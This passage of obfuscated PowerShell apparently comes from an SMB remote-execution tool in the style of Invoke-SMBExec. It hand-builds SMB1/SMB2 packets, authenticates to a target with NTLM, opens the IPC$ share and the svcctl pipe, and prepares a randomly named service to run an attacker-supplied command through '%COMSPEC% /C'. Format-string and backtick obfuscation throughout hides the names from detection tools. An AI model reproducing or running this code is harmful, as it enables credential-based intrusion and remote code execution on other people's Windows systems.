        ${PaCK`et_smb_`hEa`dER} = &("{1}{2}{0}{3}"-f 'etSMBH','Get-Pa','ck','eader') 0x73 0x18 0x07,0xc8 0xff,0xff ${pROce`s`S_Id_b`YTEs} ${sMB_Us`er`_`ID}

        if(${sMb`_`sIG`NInG})
        {
            ${pACke`T_sM`B_He`A`DEr}[("{2}{0}{5}{1}{4}{3}" -f 'BH','r_Fla','SM','s2','g','eade')] = 0x05,0x48
        }

        ${P`AC`KeT_sMB`_`hEader}[("{3}{2}{4}{1}{0}" -f '_UserID','r','B','SM','Heade')] = ${S`Mb_us`eR_iD}
        ${PACK`Et_NtlMsS`P_NEG`Oti`AtE} = &("{4}{6}{5}{3}{0}{2}{1}"-f 'L','uth','MSSPA','tNT','Get-','e','Pack') ${NtlM`SSP_RE`SpO`NSe}
        ${sM`B`_`HEaDeR} = &("{3}{2}{9}{7}{4}{5}{8}{6}{1}{0}" -f 'onary','ti','onve','C','Packe','tOrder','c','rom-','edDi','rtF') ${pAC`KET_`Sm`B_HE`A`dEr}
        ${NTLms`S`P_`NeG`ot`IATE} = &("{7}{3}{1}{5}{4}{6}{2}{0}" -f'ctionary','om-P','dDi','ertFr','etOrde','ack','re','Conv') ${PAcK`Et_NTL`MsS`P`_`NEGot`IATE}      
        ${PaCKET_s`mb_`D`ATA} = &("{6}{3}{0}{2}{5}{1}{4}"-f 'Session','eque','Setu','MB','st','pAndXR','Get-PacketS') ${nT`L`Mssp`_n`Eg`OTiaTe}
        ${S`mb`_Da`Ta} = &("{1}{4}{6}{2}{5}{3}{0}"-f 'ary','ConvertFrom-Pa','ti','n','cketOrdere','o','dDic') ${PAC`kEt`_`SMB_DaTa}
        ${pac`K`ET`_`Net`BIoS_`sesSION_S`erVice} = &("{4}{0}{1}{3}{6}{5}{2}"-f'ac','ketNetBIOSSess','rvice','i','Get-P','nSe','o') ${Sm`B_H`EADeR}."le`NGTh" ${s`mb`_data}."Le`NgtH"
        ${ne`Tbi`o`S_`SeS`sIO`N_SErVICe} = &("{3}{1}{0}{4}{2}{5}"-f'cketOr','From-Pa','Diction','Convert','dered','ary') ${Packet_NETB`I`o`s_s`eS`SION_SeRvI`ce}
        ${smb_cL`iE`NT`_sE`ND} = ${NeTBIOS_Ses`sIOn_S`E`R`VI`CE} + ${sMB_H`e`AD`Er} + ${S`mB_DA`Ta}
    }
    else
    {
        ${smB2_mEs`sa`G`E_iD} += 1
        ${P`ACk`et_`S`mB2_H`EADEr} = &("{2}{1}{4}{0}{3}"-f 'ade','-Pa','Get','r','cketSMB2He') 0x01,0x00 ${Sm`B2_m`E`SSAGe_`iD} ${SMb2_Tr`EE_`iD} ${S`mB`_sEsSi`oN_id}
        ${PAC`KEt`_NTLMssp`_aUth} = &("{3}{6}{5}{0}{4}{2}{1}" -f 'S','uth','A','Get-','SP','cketNTLM','Pa') ${N`Tlm`ssP_rEsp`o`N`sE}
        ${sM`B2_`heADeR} = &("{6}{5}{0}{3}{1}{4}{2}"-f'Or','red','ictionary','de','D','om-Packet','ConvertFr') ${p`ACkeT_`Smb`2_`H`EaDer}
        ${N`T`LMsSP_AUth} = &("{0}{3}{8}{4}{6}{9}{7}{1}{5}{2}" -f 'Con','tOrdered','y','v','r','Dictionar','om','cke','ertF','-Pa') ${p`A`cKeT_nT`L`mSs`P_A`UTH}        
        ${P`ACk`e`T_S`mb2`_DaTA} = &("{0}{1}{4}{6}{5}{3}{2}"-f'Ge','t','quest','upRe','-PacketSMB2Se','sionSet','s') ${ntlM`SSp_`AUth}
        ${sMB`2_d`A`TA} = &("{7}{0}{6}{4}{8}{5}{10}{1}{9}{2}{3}"-f 'o','ti','na','ry','tFr','-PacketOr','nver','C','om','o','deredDic') ${PACKEt`_SMB2_D`A`TA}
        ${paCk`e`T_NeTbioS_`s`EssiO`N_sER`Vi`ce} = &("{1}{6}{2}{3}{0}{5}{4}"-f'S','Get-Packe','I','OSSession','vice','er','tNetB') ${sm`B2`_he`AdER}."Len`gTH" ${s`mb2_`dA`Ta}."L`E`NgTh"
        ${NeTBIos`_seS`siO`N_seR`VIcE} = &("{8}{2}{10}{6}{5}{3}{0}{4}{9}{1}{7}" -f'r','dDictionar','r','ketO','d','c','rom-Pa','y','Conve','ere','tF') ${PaCK`Et_NeTb`IO`S_SE`Ssi`on_`SERV`i`CE}
        ${s`MB_CLIe`NT_s`end} = ${NEtbI`os_SESsIon`_S`erVi`CE} + ${s`mB2_HeAD`ER} + ${sM`B2`_dA`Ta}
    }

    ${sm`B_C`lie`Nt_StReAm}.("{1}{0}" -f'e','Writ').Invoke(${sm`B_`Cl`ieN`T_SEnd},0,${Sm`B_`cL`IEN`T_SEND}."l`enGtH") > ${n`ULl}
    ${smB`_c`LIE`Nt_ST`Ream}.("{0}{1}" -f 'Fl','ush').Invoke()
    ${sMb_c`lIE`Nt`_`StREam}.("{0}{1}" -f 'Rea','d').Invoke(${sM`B`_cLienT_rECeI`Ve},0,${smB`_cl`I`e`NT`_R`eceiVE}."Le`NGth") > ${n`ULl}

    if(${SMb_V`ErsI`ON} -eq ("{1}{0}"-f'1','SMB'))
    {

        if( ${8`14}::"tosTR`i`Ng"(${Smb_C`LieN`T_receI`VE}[9..12]) -eq ("{0}{2}{1}{3}"-f'00','0','-0','-00-00'))
        {
            &("{1}{0}{4}{2}{3}" -f'ite-','Wr','bos','e','Ver') ("$output_username "+'succe'+'s'+'s'+'fu'+'lly '+'auth'+'e'+'nticat'+'ed'+' '+'on'+' '+"$Target")
            ${logIN`_`s`UcCe`S`SFUl} = ${T`RuE}
        }
        else
        {
            &("{2}{1}{0}"-f 'put','Out','Write-') ("$output_username "+'fa'+'iled '+'t'+'o '+'au'+'t'+'hen'+'ticate '+'o'+'n '+"$Target")
            ${lo`gin_sU`CC`es`SFul} = ${F`AL`Se}
        }

    }
    else
    {
        if(  ${8`14}::"TOsT`Ri`NG"(${smb`_CLi`enT`_`R`EceivE}[12..15]) -eq ("{1}{2}{0}"-f '-00-00','00','-00'))
        {
            &("{4}{0}{3}{2}{1}"-f'er','e','os','b','Write-V') ("$output_username "+'s'+'uc'+'cessf'+'ully '+'auth'+'entica'+'t'+'ed '+'on'+' '+"$Target")
            ${LOgiN_SuC`CEs`S`F`Ul} = ${T`RUE}
        }
        else
        {
            &("{0}{3}{2}{1}"-f 'Wri','ut','p','te-Out') ("$output_username "+'fa'+'iled '+'to'+' '+'authe'+'nti'+'ca'+'te '+'on'+' '+"$Target")
            ${log`in`_`SUccEs`sf`UL} = ${Fa`l`se}
        }

    }

    if(${lOGi`N`_sU`ccEs`SF`UL})
    {
        ${S`m`B_PaTh} = "\\" + ${taR`get} + "\IPC$"

        if(${S`MB_VEr`sioN} -eq ("{1}{0}"-f'MB1','S'))
        {
            ${sm`B_`PA`TH_`BytEs} =  ( &("{1}{2}{0}" -f 'LE','v','ArIAb')  ("S"+"5u2") -VAl  )::"u`Tf8".("{0}{2}{1}" -f'Get','ytes','B').Invoke(${s`mb`_pa`Th}) + 0x00
        }
        else
        {
            ${sm`B_patH`_B`y`Tes} =   (&("{0}{1}{2}" -f'G','et-CHilDiTE','M') ("{0}{2}{1}" -f'vARI','lE:S5U2','ab') ).VAlUe::"UNi`CO`de".("{2}{1}{0}" -f 'tes','y','GetB').Invoke(${Smb_PA`TH})
        }

        ${SM`B_`N`AmED_pi`Pe_UUId} = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03

        if(!${sErV`iCE})
        {
            ${S`m`B_s`eRvice`_ran`dOM} =  ${3I`c1}::("{0}{1}" -f 'Jo','in').Invoke("00-",(1..20 | &("{1}{4}{3}{2}{0}"-f'Object','For','ch-','a','E'){"{0:X2}-" -f (&("{0}{1}{2}"-f 'Ge','t-Ran','dom') -Minimum 65 -Maximum 90)}))
            ${S`mb_seR`ViCe} = ${sMB_Se`R`VIC`E_RA`N`dOM} -replace "-00",""
            ${sM`B_s`erVi`Ce} = ${s`MB`_se`RVice}.("{2}{1}{0}" -f'bstring','u','S').Invoke(0,${sm`B_s`ervICE}."l`EngTh" - 1)
            ${SMB`_s`eRvICe} = ${sMb`_sE`RVICE}.("{0}{1}"-f'Spl','it').Invoke("-") | &("{4}{1}{3}{0}{2}"-f'ch','o','-Object','rEa','F'){[Char] (&("{1}{2}{0}" -f 'iaBle','V','Ar') ("X0gy2"+"6")  ).vAluE::("{1}{0}{2}"-f 'I','To','nt16').Invoke(${_},16)}
            ${s`m`B_SE`RvICe} = &("{0}{1}{2}"-f'New-O','bje','ct') ("{0}{2}{1}"-f'S','stem.String','y') (${S`mb`_SER`ViCE},0,${sMb_S`e`Rv`iCE}."lEN`G`Th")
            ${S`mb`_SErvi`CE_randOm} += ("{0}{3}{2}{1}" -f '00-00','0-00','00-0','-')
            ${SMB`_S`ErviCE_b`ytES} = ${sM`B_Se`RViC`E_RANDOM}.("{0}{1}" -f 'Sp','lit').Invoke("-") | &("{0}{1}{2}"-f'ForEach-Obj','e','ct'){[Char]  ( &('lS') ('v'+'aRiabL'+'E:'+'x0gY26')).VALUe::("{0}{2}{1}"-f'ToIn','6','t1').Invoke(${_},16)}
        }
        else
        {
            ${S`MB`_seRvICE} = ${se`R`ViCE}
            ${SmB`_sEr`VicE_`B`y`TES} =   ( &("{3}{0}{2}{1}"-f 'T-','IabLE','VaR','ge') ('S'+'5U2') ).VaLUE::"uNi`cO`dE".("{1}{0}{2}" -f't','Ge','Bytes').Invoke(${Sm`B`_sERvi`Ce})

            if([Bool](${s`m`B`_SERVICe}."LE`Ng`Th" % 2))
            {
                ${SmB_`s`eRVI`C`e_BY`TEs} += 0x00,0x00
            }
            else
            {
                ${smb_`ServIc`e_By`Tes} += 0x00,0x00,0x00,0x00
                
            }

        }
        
        ${sMb_`S`ERVI`ce_`lenG`Th} =  ${8`14}::("{0}{1}"-f 'GetBy','tes').Invoke(${SmB_SE`RV`ice}."LeNG`TH" + 1)

        if(${cOMM`ANdcOM`SpeC} -eq 'Y')
        {
            ${c`Om`maND} = ('%C'+'OMSP'+'EC% '+'/C'+' '+"`"") + ${COmma`ND} + "`""
        }
        else
        {
            ${co`Mm`ANd} = "`"" + ${co`Mm`ANd} + "`""
        }

         (  &("{1}{0}"-f 'tEm','gET-I')  ("VARIA"+"blE"+":s5u2") ).vaLUe::"U`TF8".("{1}{0}"-f 'tes','GetBy').Invoke(${Co`m`MAnd}) | &("{1}{3}{4}{2}{0}" -f'bject','Fo','h-O','r','Eac'){${SmBexeC_`C`o`MmANd} += "{0:X2}-00-" -f ${_}}

        if([Bool](${c`om`mAnd}."lEN`GTH" % 2))
        {
            ${SMBEX`E`C_cOM`MA`Nd} += ("{1}{0}" -f'0','00-0')
        }
        else
        {
            ${S`mB`eXEC_CoMMaND} += ("{2}{1}{3}{0}"-f'0-00','-0','00','0-0')
        }    
        
        ${sMBexe`c_c`Omm`ANd_B`y`TES} = ${Sm`BeXeC_CO`Mm`A`Nd}.("{0}{1}"-f'Spli','t').Invoke("-") | &("{1}{0}{3}{2}"-f 'ach','ForE','t','-Objec'){[Char]  (&('Ls') ('V'+'ariABle:x0'+'Gy26')  ).ValUe::("{1}{0}{2}"-f 'oIn','T','t16').Invoke(${_},16)}  
        ${sMBExeC_cOm`Ma`Nd_leng`T`h`_b`YTEs} =   ${8`14}::("{2}{0}{1}"-f'yt','es','GetB').Invoke(${SM`Be`xEc_`ComMan`D_byTeS}."L`ENG`Th" / 2)
        ${sMB_S`pl`IT`_INDeX} = 4256
        
        if(${SMB_`VERs`IoN} -eq ("{1}{0}" -f'B1','SM'))
        {
            ${sM`B_c`l`iENt`_sTa`GE} = ("{2}{3}{1}{0}" -f 'dXRequest','ctAn','TreeCo','nne')

            :SMB_execute_loop while (${S`Mb`_cLieN`T`_s`TAGe} -ne ("{0}{1}" -f 'e','xit'))
            {
            
                switch (${SMB_`c`liEnt`_STA`ge})
                {
            
                    ("{1}{4}{0}{2}{3}" -f'Re','TreeConnectAnd','que','st','X')
                    {
                        ${pA`C`kET_s`mB`_h`eaDEr} = &("{0}{3}{2}{4}{1}" -f'G','ader','t-PacketSM','e','BHe') 0x75 0x18 0x01,0x48 0xff,0xff ${p`Rocess_`i`d_Byt`eS} ${S`Mb_U`S`Er_id}

                        if(${S`M`B_s`IGNING})
                        {
                            ${M`d5} = &("{0}{2}{1}" -f 'Ne','t','w-Objec') -TypeName ("{15}{10}{0}{1}{2}{8}{7}{9}{14}{3}{4}{11}{13}{12}{5}{6}" -f 'cu','ri','ty.C','.','MD','de','r','g','rypto','raph','ystem.Se','5CryptoService','i','Prov','y','S')
                            ${pAckeT_`sM`B_hEA`DEr}[("{2}{1}{4}{3}{0}"-f'gs2','MBH','S','r_Fla','eade')] = 0x05,0x48
                            ${s`M`B_`sIGn`ing_coUnT`Er} = 2 
                            [Byte[]]${SmB`_SI`GNiN`G_SEQ`UEnCE} =  ( &("{1}{2}{0}"-f'E','V','aRIaBl')  ('8'+'14')).value::("{2}{0}{1}"-f 'etBy','tes','G').Invoke(${sMb`_SIGn`I`N`g_C`Oun`TEr}) + 0x00,0x00,0x00,0x00
                            ${pACkE`T_s`M`B_hEadeR}[("{0}{4}{1}{5}{2}{3}"-f'SMBHeade','_Si','tur','e','r','gna')] = ${SM`B_`siGNi`N`g`_SeQu`eNCe}
                        }

                        ${Smb_HE`Ad`Er} = &("{0}{1}{2}{4}{3}{5}{6}"-f'Conv','er','tFro','ketOrderedDict','m-Pac','io','nary') ${PACK`et`_s`Mb`_HEA`Der}   
                        ${p`AckEt_S`mB`_Da`Ta} = &("{2}{3}{6}{4}{0}{5}{1}"-f 'nnectAnd','Request','G','et-Pac','etSMBTreeCo','X','k') ${S`mb`_pAt`h_bY`Tes}
                        ${smB`_`dA`TA} = &("{6}{1}{3}{4}{0}{2}{5}" -f 'tOrderedDicti','nvert','on','Fr','om-Packe','ary','Co') ${PACKE`T_s`mB_`dA`Ta}
                        ${PA`c`Ket_`Ne`T`BI`O`s_sesS`iOn_SERv`ice} = &("{0}{3}{1}{5}{2}{6}{4}"-f 'Ge','et','ssionServi','t-Pack','e','NetBIOSSe','c') ${s`mb_H`EAD`ER}."Le`NGTH" ${sm`B_D`AtA}."lEn`gTh"
                        ${nEtbios_ses`Si`ON_Se`Rv`I`CE} = &("{4}{1}{3}{7}{2}{0}{6}{5}"-f 'ctiona','nv','dDi','ertFrom-Packe','Co','y','r','tOrdere') ${paCKET`_`N`etBIos_sEs`S`io`N_sErVi`cE}

                        if(${S`mB`_SIGNING})
                        {
                            ${SmB`_`SiGN} = ${s`ess`IO`N_KEY} + ${Sm`B`_HEaDeR} + ${s`mb_Da`TA} 
                            ${S`m`B_Si`g`NaTure} = ${M`d5}."c`o`MputE`hash"(${SMB_S`i`Gn})
                            ${Smb`_sIgNAT`URE} = ${Smb_SI`g`Nat`URe}[0..7]
                            ${p`ACK`eT_SM`B`_HeAdeR}[("{2}{1}{4}{3}{0}"-f 'ure','MBHeader_Sig','S','t','na')] = ${smB`_sI`GNAtUre}
                            ${SMb_hE`Ad`eR} = &("{0}{1}{7}{4}{5}{2}{6}{3}"-f'Co','nvertF','rderedD','ry','Pack','etO','ictiona','rom-') ${PACkE`T_s`MB_h`Ead`eR}
                        }

                        ${s`Mb_`ClIENT`_`S`END} = ${ne`Tb`I`O`s_sES`SI`O`N_SErvice} + ${smB_h`e`A`DEr} + ${sm`B_DA`TA}
                        ${sMb_CL`IeN`T_`sT`ReAM}.("{1}{0}"-f 'ite','Wr').Invoke(${SmB_ClIEn`T_s`E`Nd},0,${S`m`B_CLieN`T_sEnD}."l`engTh") > ${N`Ull}
                        ${s`m`B`_CLIe`Nt_sTreaM}.("{0}{1}" -f'Flus','h').Invoke()
                        ${sMB_C`Li`Ent_st`RE`AM}.("{1}{0}"-f 'ad','Re').Invoke(${s`mb_c`LIE`NT_rE`cEivE},0,${SMB_cl`I`E`NT_rEcei`VE}."L`e`NGTH") > ${N`UlL}
                        ${s`mB_CliEnT`_`StAge} = ("{3}{1}{2}{5}{0}{4}" -f'es','reate','AndXR','C','t','equ')
                    }
                  
                    ("{0}{1}{2}{3}{4}"-f'C','reateAndXReq','u','e','st')
                    {
                        ${Smb_nA`M`Ed_`P`I`PE_by`TeS} = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 
                        ${smB_`T`ReE`_iD} = ${smB_`CLiEn`T_REC`EIvE}[28,29]
                        ${P`AckE`T_`smb_`HE`Ader} = &("{5}{1}{2}{3}{0}{4}" -f 'de','t','-P','acketSMBHea','r','Ge') 0xa2 0x18 0x02,0x28 ${Sm`B_tREE`_ID} ${p`ROCe`ss_Id_By`TES} ${sMb_us`eR_`Id}

                        if(${SM`B_`siGNInG})
                        {
                            ${paCkEt`_smb`_h`Ead`er}[("{0}{1}{2}"-f'SMBH','eader','_Flags2')] = 0x05,0x48
                            ${smB`_`sIGNinG_`Cou`NtEr} = ${SM`B_SIGN`ING_`c`Ou`Nt`ER} + 2
                            [Byte[]]${sMB_s`i`gnINg_S`eQue`NCE} =   ${8`14}::("{1}{0}{2}" -f'tByt','Ge','es').Invoke(${SmB_S`i`gning`_CoUNT`eR}) + 0x00,0x00,0x00,0x00
                            ${p`AC`KET_`SMb_hEADer}[("{5}{2}{3}{6}{4}{0}{1}" -f 'ur','e','MBHead','er_S','t','S','igna')] = ${SMB`_siG`Ni`Ng_sEqU`EnCE}
                        }

                        ${sM`B_hE`ADeR} = &("{5}{7}{4}{0}{2}{6}{8}{1}{3}{9}"-f'ketOrde','o','red','na','From-Pac','C','Dic','onvert','ti','ry') ${PacK`ET`_`S`Mb_HeADEr}   
                        ${pac`kET_s`Mb`_data} = &("{0}{3}{1}{4}{6}{5}{2}" -f 'Get-PacketSMBNT','ea','est','Cr','t','u','eAndXReq') ${smB_N`A`MEd`_piP`e_byt`Es}
                        ${SmB_`dA`TA} = &("{2}{5}{3}{4}{1}{6}{0}"-f'ctionary','eredD','Convert','om-','PacketOrd','Fr','i') ${paC`K`ET_smb_`da`Ta}
                        ${PA`cKe`T_`Ne`TbI`Os`_`SeSsI`On`_seRvice} = &("{2}{5}{4}{0}{6}{3}{1}" -f 'ketNet','ionService','Ge','s','ac','t-P','BIOSSes') ${SMB_`h`E`ADER}."lEN`G`TH" ${s`M`B_daTA}."lEn`g`Th"
                        ${N`eTBIoS_`sEsSion_s`ERVi`Ce} = &("{3}{4}{9}{1}{2}{5}{6}{0}{8}{7}"-f 'ctio','m-Pac','ketOr','Convert','Fr','dere','dDi','ry','na','o') ${paCkE`T_NEtBioS`_s`E`SsIo`N`_seRvI`CE}

                        if(${Smb_`SI`g`NiNG})
                        {
                            ${smB`_`sIGn} = ${SE`ssIon_`kEY} + ${SMB`_`hEad`eR} + ${SMB_`DA`TA} 
                            ${SMB_s`IGn`AtU`RE} = ${M`d5}."cO`MPUTEhA`sh"(${smb_s`iGn})
                            ${SmB_`SI`GNAtUre} = ${sM`B_sIg`NAT`URE}[0..7]
                            ${PaCke`T_s`Mb_HEa`dER}[("{0}{2}{3}{4}{1}"-f'SMBHe','nature','ad','er','_Sig')] = ${SM`B_sig`NAtuRe}
                            ${S`mb_hEa`D`er} = &("{1}{3}{5}{8}{2}{0}{6}{9}{7}{10}{4}"-f 'r','Co','e','nvertFrom-P','ry','ac','e','o','ketOrd','dDicti','na') ${pAcKe`T_SMB_h`ea`D`er}
                        }

                        ${sMb_Cli`En`T_sE`ND} = ${NetBIos`_seSS`I`On_Se`RVi`Ce} + ${smB_`HE`AdeR} + ${SM`B_dATA}
                        ${s`m`B`_cLieNt`_StreaM}.("{1}{0}"-f 'rite','W').Invoke(${S`mB`_clIe`NT`_seND},0,${SMb_C`Li`EnT_s`END}."l`enGTH") > ${nu`Ll}
                        ${SMB_`cl`I`EN`T_STr`EAm}.("{0}{1}"-f'Flu','sh').Invoke()
                        ${SMB_cl`iEnt_str`E`AM}.("{1}{0}"-f 'ead','R').Invoke(${S`Mb_cLIENt_rE`c`e`Ive},0,${SMb_`Cli`ENt_`REC`Eive}."Le`NG`Th") > ${Nu`Ll}
                        ${Smb_Cl`ieNT`_S`T`AGe} = ("{0}{1}{2}"-f'RP','CBin','d')
                    }
                
                    ("{0}{2}{1}" -f 'R','ind','PCB')
                    {
                        ${sMB_`F`id} = ${S`mb_ClienT`_Re`C`eIvE}[42,43]
                        ${PACK`e`T`_S`M`B_HEaDER} = &("{1}{0}{2}{3}"-f 'et-Pac','G','ketSMB','Header') 0x2f 0x18 0x05,0x28 ${SmB_t`R`EE_id} ${P`ROcess_`Id_`ByTEs} ${s`mb`_uSE`R_iD}

                        if(${SMB_s`i`gninG})
                        {
                            ${Packet`_smB`_HEaD`Er}[("{2}{0}{1}" -f'lags','2','SMBHeader_F')] = 0x05,0x48
                            ${sM`B_`SIg`NI`Ng_coU`NTeR} = ${sMb`_`SigN`ING_c`oUNT`eR} + 2 
                            [Byte[]]${SM`B_sI`GniN`G_s`EQUEncE} =  ( &("{3}{1}{0}{2}" -f 'AR','V','iAbLE','GeT-')  814  ).vaLUe::("{1}{2}{0}"-f 'Bytes','G','et').Invoke(${SM`B_SIgNi`NG_`COuntEr}) + 0x00,0x00,0x00,0x00
                            ${pa`ckE`T`_SmB_heAdER}[("{2}{3}{1}{0}"-f'e','Header_Signatur','S','MB')] = ${SMb_S`I`g`NiNG_SequEncE}
                        }

                        ${Sm`B_heA`Der} = &("{1}{5}{0}{2}{3}{4}" -f'P','ConvertFro','acketOrdere','dD','ictionary','m-') ${p`Ack`eT`_sm`B_`HeaDER}
                        ${pA`C`KEt_R`p`c`_DATA} = &("{2}{1}{3}{0}" -f 'd','et-Packe','G','tRPCBin') 1 0xb8,0x10 0x01 0x00,0x00 ${smb_na`M`eD`_`pIpE_`UuiD} 0x02,0x00
                        ${RP`c_`daTA} = &("{6}{2}{3}{5}{1}{4}{0}" -f 'onary','rderedDic','ertFrom-','Pac','ti','ketO','Conv') ${PA`cK`ET_Rpc_d`ATa}
                        ${PaCKeT_Sm`B_D`A`TA} = &("{2}{0}{5}{7}{3}{8}{4}{1}{6}" -f'e','t','G','S','ri','t-Pa','eAndXRequest','cket','MBW') ${sMb`_f`ID} ${Rpc`_`daTA}."lE`NGtH"
                        ${sM`B`_dA`Ta} = &("{4}{0}{1}{3}{6}{5}{2}" -f 'rtFr','om-Pac','dDictionary','ketOrd','Conve','e','er') ${pAcK`E`T_SmB_`DATA}
                        ${R`PC_DatA_`L`En`gth} = ${S`mb_Da`TA}."lE`NGtH" + ${rpC_`d`ATA}."lEnG`TH"
                        ${pA`CKe`T_Net`BIos_SesSi`O`N_s`e`RvicE} = &("{1}{5}{4}{2}{7}{6}{0}{3}" -f 'rv','Ge','etNetBIOSSess','ice','ack','t-P','onSe','i') ${sM`B_hEAd`Er}."Le`NGtH" ${RpC_dA`T`A_L`en`Gth}
                        ${ne`TbIos_seSsIo`N`_SERv`IcE} = &("{5}{4}{0}{3}{7}{1}{2}{6}" -f 't','edD','ictionar','Ord','vertFrom-Packe','Con','y','er') ${paCke`T_`N`etbI`o`S_SEsSIo`N`_`seRVICe}

                        if(${SMb`_Sig`Ni`Ng})
                        {
                            ${s`MB`_sIGN} = ${seSS`Ion`_keY} + ${Smb`_Hea`DeR} + ${sMb_`dA`Ta} + ${r`pC_`d`AtA}
                            ${s`mb_`Si`G`NaTurE} = ${m`d5}."c`OmPUt`eH`ASH"(${sM`B_si`GN})
                            ${sMb_`SigN`A`Ture} = ${sMB_S`i`GnaTuRe}[0..7]
                            ${P`Ac`KEt`_sMB_HeadER}[("{3}{0}{1}{2}{4}" -f 'ade','r_','Sig','SMBHe','nature')] = ${sMB_s`IGNAtu`Re}
                            ${smb_`h`EA`DEr} = &("{3}{1}{10}{5}{8}{2}{4}{9}{6}{0}{7}"-f 'iction','o','From-P','C','acketO','e','edD','ary','rt','rder','nv') ${PA`C`kET_s`M`B_h`eAder}
                        }

                        ${s`mB_Cl`I`enT_`send} = ${NET`B`iOs`_seS`SIon_SE`R`ViCE} + ${Smb_`HE`AdeR} + ${S`mb_d`AtA} + ${R`pc_D`Ata}
                        ${Sm`B_cliE`Nt`_s`TreaM}.("{1}{0}" -f'rite','W').Invoke(${Sm`B_cLien`T_S`end},0,${sm`B_C`liEN`T_sEnD}."LEng`TH") > ${NU`Ll}
                        ${s`mB`_Cl`IEnt_ST`REAM}.("{1}{0}"-f 'ush','Fl').Invoke()
                        ${sMb`_c`LieN`T_`STreAM}.("{1}{0}"-f'ead','R').Invoke(${smB_`clI`En`T_`R`EceiVE},0,${S`m`B_clieN`T_rEcEI`Ve}."LeN`gtH") > ${n`UlL}
                        ${sM`B_`CLiE`NT`_StAGE} = ("{3}{2}{1}{0}" -f 'equest','XR','d','ReadAn')
                        ${SMB_ClI`enT_STagE`_`N`EXT} = ("{3}{2}{0}{1}"-f'S','CManagerW','pen','O')
                    }
               
                    ("{0}{1}{2}{3}"-f'R','eadAndXRe','qu','est')
                    {
                        &("{2}{1}{0}" -f 'rt-Sleep','ta','S') -m ${s`lEEP}
                        ${P`AckeT_sm`B`_head`Er} = &("{4}{1}{2}{0}{3}" -f'Packe','et','-','tSMBHeader','G') 0x2e 0x18 0x05,0x28 ${S`Mb_T`REE`_iD} ${PRoCeSs_`I`d`_B`YTeS} ${Sm`B_`USER_ID}

                        if(${S`Mb`_sIGN`INg})
                        {
                            ${P`ACKET_`Smb`_he`ADer}[("{4}{1}{3}{0}{2}"-f'Fl','M','ags2','BHeader_','S')] = 0x05,0x48
                            ${SM`B_S`ig`NiN`g`_cOu`NTER} = ${S`mB_`sIGNiNg_CO`UnTer} + 2 
                            [Byte[]]${sMB_S`iGni`Ng`_SeQUe`Nce} =   (&("{3}{2}{0}{1}" -f'ab','lE','et-vari','G')  814  -vALue )::("{2}{1}{0}" -f'ytes','tB','Ge').Invoke(${sMb_s`igN`InG_`COu`N`TEr}) + 0x00,0x00,0x00,0x00
                            ${paCket_S`mB`_He`ADeR}[("{4}{5}{1}{6}{2}{0}{3}"-f 'ur','ead','r_Signat','e','SMB','H','e')] = ${smB_s`iGniNg`_`SeQu`E`NcE}
                        }

                        ${s`Mb_he`AD`Er} = &("{4}{1}{6}{8}{10}{5}{3}{0}{7}{2}{9}" -f 'r','e','ar','etOrde','Conv','ck','rtFrom','edDiction','-P','y','a') ${Pa`CK`E`T_Smb_`HeADEr}   
                        ${pack`ET_s`mB_dAtA} = &("{3}{0}{2}{5}{6}{4}{1}" -f '-Pac','est','ketSMBR','Get','XRequ','ead','And') ${sMb_f`iD}
                        ${SMB`_`DaTA} = &("{5}{3}{8}{7}{4}{6}{2}{0}{1}" -f 'onar','y','ti','m-','tOrde','ConvertFro','redDic','e','Pack') ${P`AC`KET_s`mb_`DAtA}
                        ${P`A`C`ket_nETB`ios_s`ESsIoN_SErviCe} = &("{2}{6}{1}{0}{3}{4}{5}" -f 'O','tBI','Get-Packet','SSessionS','e','rvice','Ne') ${sMb_H`EA`dER}."lEn`g`TH" ${sMB_`D`ATA}."LE`NG`Th"
                        ${NEtB`io`s`_s`eSsIoN`_sErVice} = &("{4}{8}{3}{2}{0}{1}{5}{7}{9}{6}" -f'-','Packe','m','o','Convert','tOrd','edDictionary','e','Fr','r') ${PAckE`T_`NE`Tb`Ios_`sE`SsIon_ServICe}

                        if(${sM`B_SiG`Ning})
                        {
                            ${sMb`_SiGN} = ${seSSiON`_k`EY} + ${sMB_H`Ea`deR} + ${sM`B_`DAta} 
                            ${s`MB_sI`gNat`UrE} = ${M`d5}."C`O`MPUTE`HaSH"(${smb_`sI`Gn})
                            ${SMb`_s`IgNA`TurE} = ${Smb_sIg`NaTU`RE}[0..7]
                            ${P`A`C`KEt_Sm`B_header}[("{2}{3}{4}{0}{1}"-f'gnatur','e','SMBH','ead','er_Si')] = ${sMb`_`sIg`N`AtURe}
                            ${sMB_h`ea`D`eR} = &("{3}{10}{6}{0}{8}{9}{2}{1}{5}{4}{7}"-f 'om-Pack','re','rde','Con','on','dDicti','rtFr','ary','et','O','ve') ${P`ACk`ET_S`mb`_header}
                        }

                        ${SMb`_`CLiEnT`_senD} = ${NET`BIoS_SEss`IOn`_seR`Vi`CE} + ${SM`B_`hEaD`eR} + ${sMb_D`A`Ta}
                        ${sMb_`ClIEnt_St`R`eam}.("{0}{1}" -f 'Wr','ite').Invoke(${SMb_ClIEnT_`s`e`ND},0,${SmB_`clIENt`_s`eNd}."LE`NG`Th") > ${n`Ull}
                        ${SmB`_C`l`iE`NT_STrEam}.("{1}{0}" -f'sh','Flu').Invoke()
                        ${s`MB`_Cl`IEnT_st`REAm}.("{1}{0}" -f 'd','Rea').Invoke(${sMb`_cLIE`N`T_rEcE`IVe},0,${S`mB_cl`ie`Nt`_R`eCEivE}."l`eNGtH") > ${N`ULL}
                        ${S`MB_cli`e`Nt_s`TAGe} = ${smB`_c`lIe`N`T_`sta`GE_NEXt}
                    }
                
                    ("{1}{3}{2}{0}"-f 'W','Op','ager','enSCMan')
                    {
                        ${p`ACKet_S`m`B_hEADer} = &("{0}{2}{6}{4}{5}{3}{1}" -f'Get','er','-','MBHead','ke','tS','Pac') 0x2f 0x18 0x05,0x28 ${s`mb_T`REE_id} ${P`R`Oc`ESS_I`d_bYTes} ${SM`B_`User_Id}

                        if(${s`mB_si`Gn`Ing})
                        {
                            ${P`AcKE`T_s`m`B_heaDer}[("{1}{0}{2}{3}"-f 'BH','SM','ead','er_Flags2')] = 0x05,0x48
                            ${SMb_s`IgN`ing`_C`oUNTer} = ${SmB_SI`GniNG_CO`UnT`ER} + 2 
